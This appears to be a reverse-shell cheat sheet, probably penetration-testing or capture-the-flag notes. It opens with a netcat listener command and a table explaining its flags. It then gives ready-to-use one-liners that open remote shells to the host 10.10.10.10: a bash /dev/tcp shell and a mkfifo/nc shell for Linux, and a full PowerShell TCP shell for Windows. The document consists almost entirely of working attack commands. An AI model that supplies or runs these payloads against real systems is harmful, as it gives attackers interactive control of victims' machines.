# For wait connection
nc -lvnp 1234
Flag	Description
-l	Listen mode, to wait for a connection to connect to us.
-v	Verbose mode, so that we know when we receive a connection.
-n	Disable DNS resolution and only connect from/to IPs, to speed up the connection.
-p 1234	Port number netcat is listening on, and the reverse connection should be sent to.
# Connect to nc Linux rvrshell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
# Connect to nc Windows rvrshell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
